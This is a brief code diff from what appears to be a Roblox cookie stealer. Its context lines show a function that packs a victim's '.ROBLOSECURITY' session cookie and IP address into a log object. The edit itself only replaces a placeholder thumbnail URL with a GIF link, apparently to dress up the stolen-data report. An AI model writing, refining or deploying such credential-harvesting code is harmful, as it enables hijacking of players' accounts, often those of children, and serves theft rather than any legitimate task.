@@ -19,7 +19,7 @@ async function main(cookie) {
         roblosecurity: cookie, // Pass the cookie directly
         ip: ipAddr,
         tinyurl: "Error", // Placeholder for tinyURL
-        thumbnail: "https://example.com/thumbnail.png" // Replace with actual thumbnail URL
+        thumbnail: "https://i.pinimg.com/originals/80/72/09/807209a27d4946fa4c33fd5d598eba18.gif" // Replace with actual thumbnail URL
     };
 
     if (log.tinyurl === 'Error') {
